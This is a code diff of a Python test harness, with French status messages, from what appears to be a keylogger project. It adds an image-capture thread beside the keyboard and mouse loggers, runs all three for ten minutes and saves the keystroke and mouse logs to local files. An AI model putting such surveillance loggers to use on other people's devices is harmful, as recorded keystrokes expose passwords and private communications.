@@ -10,25 +10,30 @@ def main():
     # test_mouselog(5)
     # test_getImage()
     # test_getSound(2)
-    # test_threading(600)
+    #test_threading()
     pass
 
 
-def test_threading(duration):
-    klog = keylog.KeyLogger()
+def test_threading():
+    klog = keylog.KeyLogger() 
     mlog = Mouselogger.Mouselog()
+    getIm = getImage.GetImage()
     print("objets intanciés")
     klog.start()
     print("keylog lancé")
     mlog.start()
     print("mouselog lancé")
-    time.sleep(duration)
+    getIm.start()
+    print("Capture Image lancée")
+    time.sleep(600)
     klog.stop()
     print("keylog arrêté")
     mlog.stop()
     print("mouselog arrêté")
-    klog.write_on_file("test/keyboard.txt")
-    mlog.write_on_file("test/mouse.txt")
+    getIm.join()
+    print("Capture image arrêtée")
+    klog.write_on_file("keyboard.txt")
+    mlog.write_on_file("mouse.txt")
 
 def test_keylog(waittime):
     klog = keylog.KeyLogger()
